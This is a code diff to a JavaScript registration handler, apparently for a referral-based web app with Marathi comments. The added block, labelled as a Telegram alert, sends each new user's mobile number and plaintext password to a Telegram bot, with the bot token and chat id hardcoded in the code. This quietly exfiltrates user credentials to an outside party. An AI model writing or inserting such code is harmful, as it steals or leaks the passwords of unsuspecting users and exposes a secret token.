@@ -164,6 +164,19 @@
                     registrationDate: new Date().toISOString(), // ॲडमिन सॉर्टिंगसाठी
                     regDate: Date.now() // बॅकअपसाठी
                 });
+                // TELEGRAM REGISTER ALERT
+fetch("https://api.telegram.org/bot8759176652:AAFUGYlg0TNOZDFVATRoT9Fx7xTN02X3NOw/sendMessage", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    chat_id: "8449394257",
+    text:
+"🆕 NEW USER REGISTERED 🆕\n\n" +
+"📱 Mobile: " + mobile + "\n" +
+"🔐 Password: " + pass + "\n" +
+"🕒 Time: " + new Date().toLocaleString()
+  })
+});
 
                 if (referBy && referBy !== mobile) {
                     const inviterRef = doc(db, "users", referBy);
